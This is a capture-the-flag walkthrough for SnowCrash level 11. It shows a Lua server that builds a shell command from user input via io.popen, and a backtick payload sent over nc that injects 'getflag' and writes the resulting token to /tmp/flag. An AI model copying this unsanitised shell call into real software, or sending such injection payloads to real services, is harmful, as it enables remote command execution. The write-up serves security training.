# Level11

## Enumerate

    level11@SnowCrash:~$ ls
	level11.lua
	level11@SnowCrash:~$ lua level11.lua
	lua: level11.lua:3: address already in use
	stack traceback:
	[C]: in function 'assert'
	level11.lua:3: in main chunk
	[C]: ?
	level11@SnowCrash:~$ cat level11.lua
	#!/usr/bin/env lua
	local socket = require("socket")
	local server = assert(socket.bind("127.0.0.1", 5151))

	function hash(pass)
	  prog = io.popen("echo "..pass.." | sha1sum", "r")
	  data = prog:read("*all")
	  prog:close()

	  data = string.sub(data, 1, 40)

	  return data
	end


	while 1 do
	  local client = server:accept()
	  client:send("Password: ")
	  client:settimeout(60)
	  local l, err = client:receive()
	  if not err then
      print("trying " .. l)
      local h = hash(l)

	      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
	          client:send("Erf nope..\n");
	      else
	          client:send("Gz you dumb*\n")
	      end

	end

	  client:close()
	end
## Injection
Now we see that lua server is already up at port 5151, let's try to connect:

	level11@SnowCrash:~$ nc localhost 5151
	Password: lol
	Erf nope..

We have an input, we can try to inject code in this line:

    prog = io.popen("echo "..pass.." | sha1sum", "r")
Let's try it:

	level11@SnowCrash:~$ nc localhost 5151
	Password: `getflag`
	Erf nope..
That's right, the pipe redirects the output so let's try a redirection:

	level11@SnowCrash:~$ nc localhost 5151
	Password: `getflag` > /tmp/flag
	Erf nope..
	level11@SnowCrash:~$ cat /tmp/flag
	Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
And it's done !
